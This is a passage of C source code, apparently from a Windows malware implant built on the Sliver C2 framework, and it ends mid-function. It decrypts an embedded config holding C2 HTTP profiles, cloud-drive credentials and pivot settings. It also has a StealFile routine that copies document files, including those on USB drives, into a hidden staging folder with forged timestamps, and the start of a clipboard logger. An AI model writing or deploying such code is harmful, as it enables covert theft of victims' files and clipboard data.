//			pHttpProfile = pConfig->HttpProfiles[i];
//			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cPollPaths);
//			for (j = 0; j < pHttpProfile->cPollPaths; j++) {
//				pBufferList[j] = BufferInit(pHttpProfile->PollPaths[j], lstrlenA(pHttpProfile->PollPaths[j]));
//			}
//
//			HttpElements[0] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cPollPaths, 1);
//			FreeBufferList(pBufferList, pHttpProfile->cPollPaths);
//
//			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cPollFiles);
//			for (j = 0; j < pHttpProfile->cPollFiles; j++) {
//				pBufferList[j] = BufferInit(pHttpProfile->PollFiles[j], lstrlenA(pHttpProfile->PollFiles[j]));
//			}
//
//			HttpElements[1] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cPollFiles, 2);
//			FreeBufferList(pBufferList, pHttpProfile->cPollFiles);
//
//			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cSessionPaths);
//			for (j = 0; j < pHttpProfile->cSessionPaths; j++) {
//				pBufferList[j] = BufferInit(pHttpProfile->SessionPaths[j], lstrlenA(pHttpProfile->SessionPaths[j]));
//			}
//
//			HttpElements[2] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cSessionPaths, 3);
//			FreeBufferList(pBufferList, pHttpProfile->cSessionPaths);
//
//			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cSessionFiles);
//			for (j = 0; j < pHttpProfile->cSessionFiles; j++) {
//				pBufferList[j] = BufferInit(pHttpProfile->SessionFiles[j], lstrlenA(pHttpProfile->SessionFiles[j]));
//			}
//
//			HttpElements[3] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cSessionFiles, 4);
//			FreeBufferList(pBufferList, pHttpProfile->cSessionFiles);
//
//			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cClosePaths);
//			for (j = 0; j < pHttpProfile->cClosePaths; j++) {
//				pBufferList[j] = BufferInit(pHttpProfile->ClosePaths[j], lstrlenA(pHttpProfile->ClosePaths[j]));
//			}
//
//			HttpElements[4] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cClosePaths, 5);
//			FreeBufferList(pBufferList, pHttpProfile->cClosePaths);
//
//			pBufferList = ALLOC(sizeof(PBUFFER) * pHttpProfile->cCloseFiles);
//			for (j = 0; j < pHttpProfile->cCloseFiles; j++) {
//				pBufferList[j] = BufferInit(pHttpProfile->CloseFiles[j], lstrlenA(pHttpProfile->CloseFiles[j]));
//			}
//
//			HttpElements[5] = CreateRepeatedBytesElement(pBufferList, pHttpProfile->cCloseFiles, 6);
//			FreeBufferList(pBufferList, pHttpProfile->cCloseFiles);
//
//			HttpElements[6] = CreateBytesElement(pHttpProfile->lpUserAgent, lstrlenA(pHttpProfile->lpUserAgent), 7);
//			HttpElements[7] = CreateBytesElement(pHttpProfile->lpOtpSecret, lstrlenA(pHttpProfile->lpOtpSecret), 8);
//			HttpElements[8] = CreateVarIntElement(pHttpProfile->dwMinNumberOfSegments, 9);
//			HttpElements[9] = CreateVarIntElement(pHttpProfile->dwMaxNumberOfSegments, 10);
//			HttpElements[10] = CreateVarIntElement(pHttpProfile->dwPollInterval, 11);
//			HttpElements[11] = CreateBytesElement(pHttpProfile->lpUrl, lstrlenA(pHttpProfile->lpUrl), 12);
//			HttpList[i] = CreateStructElement(HttpElements, _countof(HttpElements), 0);
//		}
//
//		ConfigElements[14] = CreateRepeatedStructElement(HttpList, pConfig->cHttpProfiles, 15);
//		FREE(HttpList);
//	}
//
//	if (pConfig->cPivotProfiles > 0) {
//		PivotList = ALLOC(sizeof(PPBElement) * pConfig->cPivotProfiles);
//		for (i = 0; i < pConfig->cPivotProfiles; i++) {
//			pPivotProfile = pConfig->PivotProfiles[i];
//			PivotElements[0] = CreateBytesElement(pPivotProfile->lpBindAddress, lstrlenA(pPivotProfile->lpBindAddress), 1);
//			PivotList[i] = CreateStructElement(PivotElements, _countof(PivotElements), 0);
//		}
//
//		ConfigElements[15] = CreateRepeatedStructElement(PivotList, pConfig->cPivotProfiles, 16);
//	}
//
//	ConfigElements[16] = CreateVarIntElement(pConfig->Loot, 17);
//	ConfigElements[17] = CreateVarIntElement(pConfig->Clipboard, 18);
//	if (pConfig->lpProxy != NULL) {
//		lpTemp = ConvertWcharToChar(pConfig->lpProxy);
//		ConfigElements[18] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 19);
//	}
//	
//	FinalElement = CreateStructElement(ConfigElements, _countof(ConfigElements), 0);
//	//WriteToFile(pConfig->lpConfigPath, FinalElement->pMarshaledData, FinalElement->cbMarshaledData);
//CLEANUP:
//	FreeElement(FinalElement);
//	FREE(lpTemp);
//}

PBYTE GetConfigData
(
	_Out_ PUINT64 pcbConfigData
)
{
	PUINT64 pTemp = (PUINT64)GetConfigData;
	UINT64 cbConfigData = 0;
	UINT64 uKey = 0x254b70d8fe6a904e;
	UINT64 uKey2 = 0x777733e22f9889c2;
	PBYTE pResult = NULL;

	pTemp = (PUINT64)((ULONG_PTR)pTemp - ((ULONG_PTR)pTemp % sizeof(LPVOID)));
	while (TRUE) {
		if (pTemp[0] == uKey) {
			break;
		}

		pTemp += 1;
	}

	cbConfigData = pTemp[1] ^ uKey2 ^ uKey;
	pResult = ALLOC(cbConfigData);
	memcpy(pResult, (PBYTE)(&pTemp[2]), cbConfigData);
	Rc4EncryptDecrypt(pResult, cbConfigData, "config_key", lstrlenA("config_key"));
	if (pcbConfigData != NULL) {
		*pcbConfigData = cbConfigData;
	}

	return pResult;
}

PGLOBAL_CONFIG UnmarshalConfig()
{
	PBYTE pMarshaledData = NULL;
	DWORD cbMarshaledData = 0;
	PGLOBAL_CONFIG pResult = NULL;
	LPVOID* UnmarshaledData = NULL;
	PPBElement ConfigElements[20];
	PPBElement DriveConfigElements[10];
	PPBElement HttpConfigElements[12];
	PPBElement PivotConfigElements[1];
	DWORD i = 0;
	DWORD j = 0;
	PBUFFER pTemp = NULL;
	LPVOID* pTemp2 = NULL;
	PDRIVE_PROFILE pDriveProfile = NULL;
	PHTTP_PROFILE pHttpProfile = NULL;
	PPIVOT_PROFILE pPivotProfile = NULL;
	LPWSTR lpTemp = NULL;

#if defined(_DEBUG) || !defined(_SHELLCODE) 
	pMarshaledData = ReadFromFile(L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\logitech.cfg", &cbMarshaledData);
	Rc4EncryptDecrypt(pMarshaledData, cbMarshaledData, "config_key", lstrlenA("config_key"));
#else
	pMarshaledData = GetConfigData(&cbMarshaledData);
#endif
	if (pMarshaledData == NULL || cbMarshaledData == 0) {
		goto CLEANUP;
	}

	for (i = 0; i < _countof(ConfigElements); i++) {
		ConfigElements[i] = ALLOC(sizeof(PBElement));
		ConfigElements[i]->dwFieldIdx = i + 1;
		ConfigElements[i]->Type = Bytes;
	}

	ConfigElements[7]->Type = Varint;
	ConfigElements[8]->Type = Varint;
	ConfigElements[9]->Type = Varint;
	ConfigElements[10]->Type = Varint;
	ConfigElements[11]->Type = Varint;
	ConfigElements[12]->Type = RepeatedBytes;
	ConfigElements[13]->Type = RepeatedBytes;
	ConfigElements[14]->Type = RepeatedBytes;
	ConfigElements[15]->Type = Varint;
	ConfigElements[16]->Type = Varint;
	for (i = 0; i < _countof(DriveConfigElements); i++) {
		DriveConfigElements[i] = ALLOC(sizeof(PBElement));
		DriveConfigElements[i]->dwFieldIdx = i + 1;
		DriveConfigElements[i]->Type = Bytes;
	}

	DriveConfigElements[9]->Type = Varint;
	for (i = 0; i < _countof(HttpConfigElements); i++) {
		HttpConfigElements[i] = ALLOC(sizeof(PBElement));
		HttpConfigElements[i]->dwFieldIdx = i + 1;
		HttpConfigElements[i]->Type = RepeatedBytes;
	}
	
	HttpConfigElements[6]->Type = Bytes;
	HttpConfigElements[7]->Type = Bytes;
	HttpConfigElements[8]->Type = Varint;
	HttpConfigElements[9]->Type = Varint;
	HttpConfigElements[10]->Type = Varint;
	HttpConfigElements[11]->Type = Bytes;
	for (i = 0; i < _countof(PivotConfigElements); i++) {
		PivotConfigElements[i] = ALLOC(sizeof(PBElement));
		PivotConfigElements[i]->dwFieldIdx = i + 1;
		PivotConfigElements[i]->Type = Bytes;
	}

	UnmarshaledData = UnmarshalStruct(ConfigElements, _countof(ConfigElements), pMarshaledData, cbMarshaledData, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(GLOBAL_CONFIG));
	if (UnmarshaledData[0] != NULL) {
		pResult->lpRecipientPubKey = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[0]);
		UnmarshaledData[0] = NULL;
	}

	if (UnmarshaledData[1] != NULL) {
		pResult->lpPeerPubKey = DuplicateStrA(((PBUFFER)UnmarshaledData[1])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[1]);
		UnmarshaledData[1] = NULL;
	}

	if (UnmarshaledData[2] != NULL) {
		pResult->lpPeerPrivKey = DuplicateStrA(((PBUFFER)UnmarshaledData[2])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[2]);
		UnmarshaledData[2] = NULL;
	}

	if (UnmarshaledData[3] != NULL) {
		pResult->lpServerMinisignPublicKey = DuplicateStrA(((PBUFFER)UnmarshaledData[3])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[3]);
		UnmarshaledData[3] = NULL;
	}

	if (UnmarshaledData[4] != NULL) {
		pResult->lpSliverName = DuplicateStrA(((PBUFFER)UnmarshaledData[4])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[4]);
		UnmarshaledData[4] = NULL;
	}

	if (UnmarshaledData[5] != NULL) {
		pResult->lpConfigID = DuplicateStrA(((PBUFFER)UnmarshaledData[5])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[5]);
		UnmarshaledData[5] = NULL;
	}

	if (UnmarshaledData[6] != NULL) {
		pResult->lpPeerAgePublicKeySignature = DuplicateStrA(((PBUFFER)UnmarshaledData[6])->pBuffer, 0);
		FreeBuffer(UnmarshaledData[6]);
		UnmarshaledData[6] = NULL;
	}

	pResult->uEncoderNonce = (UINT64)UnmarshaledData[7];
	pResult->dwMaxConnectionErrors = (DWORD)UnmarshaledData[8];
	pResult->dwReconnectInterval = (DWORD)UnmarshaledData[9];
	if (UnmarshaledData[15] != NULL) {
		pResult->Loot = TRUE;
	}

	if (UnmarshaledData[16] != NULL) {
		pResult->Clipboard = TRUE;
	}

	if (UnmarshaledData[17] != NULL) {
		pResult->lpProxy = ConvertCharToWchar(((PBUFFER)UnmarshaledData[17])->pBuffer);
	}

	if (UnmarshaledData[18] != NULL) {
		lpTemp = ConvertCharToWchar(((PBUFFER)UnmarshaledData[18])->pBuffer);
		pResult->lpSliverPath = ALLOC(MAX_PATH * sizeof(WCHAR));
		ExpandEnvironmentStringsW(lpTemp, pResult->lpSliverPath, MAX_PATH);
		FREE(lpTemp);
	}

	if (UnmarshaledData[19] != NULL) {
		lpTemp = ConvertCharToWchar(((PBUFFER)UnmarshaledData[19])->pBuffer);
		pResult->lpMainExecutable = ALLOC(MAX_PATH * sizeof(WCHAR));
		ExpandEnvironmentStringsW(lpTemp, pResult->lpMainExecutable, MAX_PATH);
		FREE(lpTemp);
	}

	pResult->Type = (ImplantType)UnmarshaledData[11];
	pResult->Protocol = (ProtocolType)UnmarshaledData[10];
	if (UnmarshaledData[12] != NULL) {
		pResult->cDriveProfiles = *((PDWORD)UnmarshaledData[12]);
		if (pResult->cDriveProfiles > 0) {
			pResult->DriveProfiles = ALLOC(sizeof(PDRIVE_PROFILE) * pResult->cDriveProfiles);
			for (i = 0; i < pResult->cDriveProfiles; i++) {
				pTemp = ((PBUFFER*)UnmarshaledData[12])[i + 1];
				pTemp2 = UnmarshalStruct(DriveConfigElements, _countof(DriveConfigElements), pTemp->pBuffer, pTemp->cbBuffer, NULL);
				if (pTemp2 != NULL) {
					pDriveProfile = ALLOC(sizeof(DRIVE_PROFILE));
					if (pTemp2[0] != NULL) {
						pDriveProfile->lpClientID = DuplicateStrA(((PBUFFER)pTemp2[0])->pBuffer, 0);
						FreeBuffer(pTemp2[0]);
					}

					if (pTemp2[1] != NULL) {
						pDriveProfile->lpClientSecret = DuplicateStrA(((PBUFFER)pTemp2[1])->pBuffer, 0);
						FreeBuffer(pTemp2[1]);
					}

					if (pTemp2[2] != NULL) {
						pDriveProfile->lpRefreshToken = DuplicateStrA(((PBUFFER)pTemp2[2])->pBuffer, 0);
						FreeBuffer(pTemp2[2]);
					}

					if (pTemp2[3] != NULL) {
						pDriveProfile->lpUserAgent = DuplicateStrA(((PBUFFER)pTemp2[3])->pBuffer, 0);
						FreeBuffer(pTemp2[3]);
					}

					if (pTemp2[4] != NULL) {
						pDriveProfile->lpStartExtension = DuplicateStrA(((PBUFFER)pTemp2[4])->pBuffer, 0);
						FreeBuffer(pTemp2[4]);
					}

					if (pTemp2[5] != NULL) {
						pDriveProfile->lpSendExtension = DuplicateStrA(((PBUFFER)pTemp2[5])->pBuffer, 0);
						FreeBuffer(pTemp2[5]);
					}

					if (pTemp2[6] != NULL) {
						pDriveProfile->lpRecvExtension = DuplicateStrA(((PBUFFER)pTemp2[6])->pBuffer, 0);
						FreeBuffer(pTemp2[6]);
					}

					if (pTemp2[7] != NULL) {
						pDriveProfile->lpRegisterExtension = DuplicateStrA(((PBUFFER)pTemp2[7])->pBuffer, 0);
						FreeBuffer(pTemp2[7]);
					}

					if (pTemp2[8] != NULL) {
						pDriveProfile->lpCloseExtension = DuplicateStrA(((PBUFFER)pTemp2[8])->pBuffer, 0);
						FreeBuffer(pTemp2[8]);
					}
					
					pDriveProfile->dwPollInterval = (DWORD)pTemp2[9];
					pResult->DriveProfiles[i] = pDriveProfile;
					FREE(pTemp2);
				}

				FreeBuffer(pTemp);
			}
		}

		FREE(UnmarshaledData[12]);
	}

	if (UnmarshaledData[13] != NULL) {
		pResult->cHttpProfiles = *((PDWORD)UnmarshaledData[13]);
		if (pResult->cHttpProfiles > 0) {
			pResult->HttpProfiles = ALLOC(sizeof(PHTTP_PROFILE) * pResult->cHttpProfiles);
			for (i = 0; i < pResult->cHttpProfiles; i++) {
				pTemp = ((PBUFFER*)UnmarshaledData[13])[i + 1];
				pTemp2 = UnmarshalStruct(HttpConfigElements, _countof(HttpConfigElements), pTemp->pBuffer, pTemp->cbBuffer, NULL);
				if (pTemp2 != NULL) {
					pHttpProfile = ALLOC(sizeof(HTTP_PROFILE));
					if (pTemp2[0] != NULL) {
						pHttpProfile->cPollPaths = *((PDWORD)pTemp2[0]);
						if (pHttpProfile->cPollPaths > 0) {
							pHttpProfile->PollPaths = ALLOC(sizeof(LPSTR) * pHttpProfile->cPollPaths);
							for (j = 0; j < pHttpProfile->cPollPaths; j++) {
								pHttpProfile->PollPaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[0])[j + 1]->pBuffer, 0);
								FreeBuffer(((PBUFFER*)pTemp2[0])[j + 1]);
							}
						}

						FREE(pTemp2[0]);
					}

					if (pTemp2[1] != NULL) {
						pHttpProfile->cPollFiles = *((PDWORD)pTemp2[1]);
						if (pHttpProfile->cPollFiles > 0) {
							pHttpProfile->PollFiles = ALLOC(sizeof(LPSTR) * pHttpProfile->cPollFiles);
							for (j = 0; j < pHttpProfile->cPollFiles; j++) {
								pHttpProfile->PollFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[1])[j + 1]->pBuffer, 0);
								FreeBuffer(((PBUFFER*)pTemp2[1])[j + 1]);
							}
						}

						FREE(pTemp2[1]);
					}

					if (pTemp2[2] != NULL) {
						pHttpProfile->cSessionPaths = *((PDWORD)pTemp2[2]);
						if (pHttpProfile->cSessionPaths > 0) {
							pHttpProfile->SessionPaths = ALLOC(sizeof(LPSTR) * pHttpProfile->cSessionPaths);
							for (j = 0; j < pHttpProfile->cSessionPaths; j++) {
								pHttpProfile->SessionPaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[2])[j + 1]->pBuffer, 0);
								FreeBuffer(((PBUFFER*)pTemp2[2])[j + 1]);
							}
						}

						FREE(pTemp2[2]);
					}

					if (pTemp2[3] != NULL) {
						pHttpProfile->cSessionFiles = *((PDWORD)pTemp2[3]);
						if (pHttpProfile->cSessionFiles > 0) {
							pHttpProfile->SessionFiles = ALLOC(sizeof(LPSTR) * pHttpProfile->cSessionFiles);
							for (j = 0; j < pHttpProfile->cSessionFiles; j++) {
								pHttpProfile->SessionFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[3])[j + 1]->pBuffer, 0);
								FreeBuffer(((PBUFFER*)pTemp2[3])[j + 1]);
							}
						}

						FREE(pTemp2[3]);
					}

					if (pTemp2[4] != NULL) {
						pHttpProfile->cClosePaths = *((PDWORD)pTemp2[4]);
						if (pHttpProfile->cClosePaths > 0) {
							pHttpProfile->ClosePaths = ALLOC(sizeof(LPSTR) * pHttpProfile->cClosePaths);
							for (j = 0; j < pHttpProfile->cClosePaths; j++) {
								pHttpProfile->ClosePaths[j] = DuplicateStrA(((PBUFFER*)pTemp2[4])[j + 1]->pBuffer, 0);
								FreeBuffer(((PBUFFER*)pTemp2[4])[j + 1]);
							}
						}

						FREE(pTemp2[4]);
					}

					if (pTemp2[5] != NULL) {
						pHttpProfile->cCloseFiles = *((PDWORD)pTemp2[5]);
						if (pHttpProfile->cCloseFiles > 0) {
							pHttpProfile->CloseFiles = ALLOC(sizeof(LPSTR) * pHttpProfile->cCloseFiles);
							for (j = 0; j < pHttpProfile->cCloseFiles; j++) {
								pHttpProfile->CloseFiles[j] = DuplicateStrA(((PBUFFER*)pTemp2[5])[j + 1]->pBuffer, 0);
								FreeBuffer(((PBUFFER*)pTemp2[5])[j + 1]);
							}
						}

						FREE(pTemp2[5]);
					}

					if (pTemp2[6] != NULL) {
						pHttpProfile->lpUserAgent = DuplicateStrA(((PBUFFER)pTemp2[6])->pBuffer, 0);
						FreeBuffer(pTemp2[6]);
					}

					if (pTemp2[7] != NULL) {
						pHttpProfile->lpOtpSecret = DuplicateStrA(((PBUFFER)pTemp2[7])->pBuffer, 0);
						FreeBuffer(pTemp2[7]);
					}

					pHttpProfile->dwMinNumberOfSegments = (DWORD)pTemp2[8];
					pHttpProfile->dwMaxNumberOfSegments = (DWORD)pTemp2[9];
					pHttpProfile->dwPollInterval = (DWORD)pTemp2[10];
					if (pTemp2[11] != NULL) {
						pHttpProfile->lpUrl = DuplicateStrA(((PBUFFER)pTemp2[11])->pBuffer, 0);
						FreeBuffer(pTemp2[11]);
					}

					pResult->HttpProfiles[i] = pHttpProfile;
					FREE(pTemp2);
				}

				FreeBuffer(pTemp);
			}
		}

		FREE(UnmarshaledData[13]);
	}

	if (UnmarshaledData[14] != NULL) {
		pResult->cPivotProfiles = *((PDWORD)UnmarshaledData[14]);
		if (pResult->cPivotProfiles > 0) {
			pResult->PivotProfiles = ALLOC(sizeof(PPIVOT_PROFILE) * pResult->cPivotProfiles);
			for (i = 0; i < pResult->cPivotProfiles; i++) {
				pTemp = ((PBUFFER*)UnmarshaledData[14])[i + 1];
				pTemp2 = UnmarshalStruct(PivotConfigElements, _countof(PivotConfigElements), pTemp->pBuffer, pTemp->cbBuffer, NULL);
				if (pTemp2 != NULL) {
					pPivotProfile = ALLOC(sizeof(PIVOT_PROFILE));
					if (pTemp2[0] != NULL) {
						pPivotProfile->lpBindAddress = DuplicateStrA(((PBUFFER)pTemp2[0])->pBuffer, 0);
						FreeBuffer(pTemp2[0]);
					}

					pResult->PivotProfiles[i] = pPivotProfile;
					FREE(pTemp2);
				}

				FreeBuffer(pTemp);
			}
		}

		FREE(UnmarshaledData[14]);
	}

	//pResult->lpConfigPath = DuplicateStrW(lpConfigPath, 0);

CLEANUP:
	FREE(pMarshaledData);
	FREE(UnmarshaledData);
	for (i = 0; i < _countof(ConfigElements); i++) {
		FREE(ConfigElements[i]);
	}

	for (i = 0; i < _countof(HttpConfigElements); i++) {
		FREE(HttpConfigElements[i]);
	}

	for (i = 0; i < _countof(DriveConfigElements); i++) {
		FREE(DriveConfigElements[i]);
	}

	for (i = 0; i < _countof(PivotConfigElements); i++) {
		FREE(PivotConfigElements[i]);
	}

	return pResult;
}

VOID FreeHttpProfile
(
	_In_ PHTTP_PROFILE pProfile
)
{
	DWORD i = 0;

	if (pProfile != NULL) {
		FREE(pProfile->lpUrl);
		if (pProfile->PollPaths != NULL) {
			for (i = 0; i < pProfile->cPollPaths; i++) {
				FREE(pProfile->PollPaths[i]);
			}

			FREE(pProfile->PollPaths);
		}
		
		if (pProfile->PollFiles != NULL) {
			for (i = 0; i < pProfile->cPollFiles; i++) {
				FREE(pProfile->PollFiles[i]);
			}

			FREE(pProfile->PollFiles);
		}

		if (pProfile->SessionPaths != NULL) {
			for (i = 0; i < pProfile->cSessionPaths; i++) {
				FREE(pProfile->SessionPaths[i]);
			}

			FREE(pProfile->SessionPaths);
		}

		if (pProfile->SessionFiles != NULL) {
			for (i = 0; i < pProfile->cSessionFiles; i++) {
				FREE(pProfile->SessionFiles[i]);
			}

			FREE(pProfile->SessionFiles);
		}

		if (pProfile->ClosePaths != NULL) {
			for (i = 0; i < pProfile->cClosePaths; i++) {
				FREE(pProfile->ClosePaths[i]);
			}

			FREE(pProfile->ClosePaths);
		}

		if (pProfile->CloseFiles != NULL) {
			for (i = 0; i < pProfile->cCloseFiles; i++) {
				FREE(pProfile->CloseFiles[i]);
			}

			FREE(pProfile->CloseFiles);
		}

		FREE(pProfile->lpUserAgent);
		FREE(pProfile->lpOtpSecret);
		FREE(pProfile);
	}
}

VOID FreeDriveProfile
(
	_In_ PDRIVE_PROFILE pProfile
)
{
	if (pProfile != NULL) {
		FREE(pProfile->lpClientID);
		FREE(pProfile->lpClientSecret);
		FREE(pProfile->lpRefreshToken);
		FREE(pProfile->lpUserAgent);
		FREE(pProfile->lpStartExtension);
		FREE(pProfile->lpSendExtension);
		FREE(pProfile->lpRecvExtension);
		FREE(pProfile->lpRegisterExtension);
		FREE(pProfile->lpCloseExtension);

		FREE(pProfile);
	}
}

VOID FreePivotProfile
(
	_In_ PPIVOT_PROFILE pProfile
)
{
	if (pProfile != NULL) {
		FREE(pProfile->lpBindAddress);
		FREE(pProfile);
	}
}

VOID CopyFileToWarehouse
(
	_In_ LPWSTR lpPath,
	_In_ PGLOBAL_CONFIG pConfig
)
{
	LPWSTR lpWarehouse = NULL;
	PBYTE pFileData = NULL;
	DWORD cbFileData = 0;
	PBYTE pNameDigest = NULL;
	LPWSTR lpNameHexDigest = NULL;
	WCHAR wszDriveName[] = L"A:\\";
	DWORD dwSectorsPerCluster = 0;
	DWORD dwBytesPerSector = 0;
	DWORD dwNumberOfFreeClusters = 0;
	DWORD dwTotalNumberOfClusters = 0;
	UINT64 uPercentFull = 0;
	DWORD dwFileSize = 0;
	FILETIME CreationTime;
	FILETIME LastAccessTime;
	FILETIME LastWriteTime;
	LPSTR lpConvertedPath = NULL;
	PBYTE pPlainText = NULL;
	DWORD cbPlainText = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}

	if (!GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
		CloseHandle(hFile);
		goto CLEANUP;
	}

	CloseHandle(hFile);
	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 0x10);
	if (!IsFolderExist(lpWarehouse)) {
		if (!CreateDirectoryW(lpWarehouse, NULL)) {
			LOG_ERROR("CreateDirectoryW", GetLastError());
			goto CLEANUP;
		}

		if (!SetFileAttributesW(lpWarehouse, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
			LOG_ERROR("SetFileAttributesW", GetLastError());
			goto CLEANUP;
		}
	}

	wszDriveName[0] += PathGetDriveNumberW(lpWarehouse);
	if (!GetDiskFreeSpaceW(wszDriveName, &dwSectorsPerCluster, &dwBytesPerSector, &dwNumberOfFreeClusters, &dwTotalNumberOfClusters)) {
		LOG_ERROR("GetDiskFreeSpaceW", GetLastError());
		goto CLEANUP;
	}

	uPercentFull = (UINT64)dwNumberOfFreeClusters * 100;
	uPercentFull /= dwTotalNumberOfClusters;
	if (uPercentFull <= 15) {
		goto CLEANUP;
	}

	pFileData = ReadFromFile(lpPath, &cbFileData);
	if (pFileData == NULL) {
		goto CLEANUP;
	}

	lpConvertedPath = ConvertWcharToChar(lpPath);
	cbPlainText = lstrlenA(lpConvertedPath) + 1 + cbFileData;
	pPlainText = ALLOC(cbPlainText);
	lstrcpyA(pPlainText, lpConvertedPath);
	memcpy(&pPlainText[lstrlenA(lpConvertedPath) + 1], pFileData, cbFileData);
	pNameDigest = ComputeSHA256(lpConvertedPath, lstrlenA(lpConvertedPath));
	lpNameHexDigest = ConvertBytesToHexW(pNameDigest, SHA256_HASH_SIZE);
	lpNameHexDigest[SHA256_HASH_SIZE] = L'\0';
	lstrcatW(lpWarehouse, L"\\");
	lstrcatW(lpWarehouse, lpNameHexDigest);
	if (!WriteToFile(lpWarehouse, pPlainText, cbPlainText)) {
		goto CLEANUP;
	}

	hFile = CreateFileW(lpWarehouse, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime);
	CloseHandle(hFile);
CLEANUP:
	FREE(lpConvertedPath);
	FREE(lpWarehouse);
	FREE(pFileData);
	FREE(pPlainText);
	FREE(pNameDigest);
	FREE(lpNameHexDigest);
}

BOOL StealFile
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID* Args
)
{
	DWORD i = 0;
	DWORD j = 0;
	DWORD k = 0;
	LPWSTR lpExtension = NULL;
	LPWSTR lpExtension2 = NULL;
	PARCHIVE_INFO pArchiveInfo = NULL;
	PITEM_INFO pItem = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwFileSize = 0;
	BOOL IsUsb = FALSE;
	PGLOBAL_CONFIG pConfig = NULL;
	FILETIME LastWriteTime;
	BOOL Result = FALSE;
	LPWSTR lpBit7zPath = NULL;

	IsUsb = (BOOL)Args[0];
	pConfig = (PGLOBAL_CONFIG)Args[1];
	if (pConfig->StopLooting) {
		Result = TRUE;
		goto CLEANUP;
	}

	if (StrStrIW(lpPath, L"RECYCLE.BIN")) {
		Result = TRUE;
		goto CLEANUP;
	}
	
	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}
	
	if (!IsUsb && GetFileTime(hFile, NULL, NULL, &LastWriteTime)) {
		if (CompareFileTime(&LastWriteTime, &pConfig->LastLootTime) != 1) {
			goto CLEANUP;
		}
	}

	dwFileSize = GetFileSize(hFile, NULL);
	CloseHandle(hFile);
	hFile = INVALID_HANDLE_VALUE;
	if (dwFileSize > 100000000) {
		goto CLEANUP;
	}

	lpExtension = PathFindExtensionW(lpPath);
	if (lpExtension[0] != L'\0') {
		for (i = 0; i < pConfig->cDocumentExtensions; i++) {
			if (!lstrcmpW(lpExtension, pConfig->DocumentExtensions[i])) {
				CopyFileToWarehouse(lpPath, pConfig);
				goto CLEANUP;
			}
		}

		/*lpBit7zPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(L"\\LogitechLcd.dll"));
		lstrcatW(lpBit7zPath, L"\\LogitechLcd.dll");
		if (IsFileExist(lpBit7zPath)) {
			for (i = 0; i < pConfig->cArchiveExtensions; i++) {
				if (!lstrcmpW(lpExtension, pConfig->ArchiveExtensions[i])) {
					pArchiveInfo = Bit7zGetInfo(lpBit7zPath, lpPath);
					if (pArchiveInfo == NULL) {
						break;
					}

					for (j = 0; j < pArchiveInfo->dwNumberOfItems; j++) {
						pItem = pArchiveInfo->ItemList[j];
						if (pItem == NULL) {
							continue;
						}

						lpExtension2 = PathFindExtensionW(pItem->lpPath);
						if (lpExtension2[0] != L'\0') {
							for (k = 0; k < pConfig->cDocumentExtensions; k++) {
								if (!lstrcmpW(lpExtension2, pConfig->DocumentExtensions[k])) {
									CopyFileToWarehouse(lpPath, pConfig);
									goto CLEANUP;
								}
							}
						}
					}

					break;
				}
			}
		}*/
	}

CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}

	FreeArchiveInfo(pArchiveInfo);
	FREE(lpBit7zPath);
	/*if (ItemList != NULL) {
		for (j = 0; j < dwNumberOfItems; j++) {
			FreeItemInfo(ItemList[j]);
		}

		FREE(ItemList);
	}*/

	return Result;
}

LRESULT CALLBACK WndProc
(
	_In_ HWND hwnd,
	_In_ UINT msg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	HANDLE hClipboard = NULL;
	LPWSTR lpMessage = NULL;
	LPSTR lpTemp = NULL;
	SYSTEMTIME SystemTime;
	CHAR szTemp[0x100];
	LPWSTR lpClipboardPath = NULL;
	CREATESTRUCTW* pCreateStruct = NULL;

	if (msg == WM_CLIPBOARDUPDATE) {
		if (OpenClipboard(NULL)) {
			hClipboard = GetClipboardData(CF_UNICODETEXT);
			if (hClipboard != NULL) {
				lpMessage = (LPWSTR)GlobalLock(hClipboard);
				lpTemp = ConvertWcharToChar(lpMessage);
				GetSystemTime(&SystemTime);
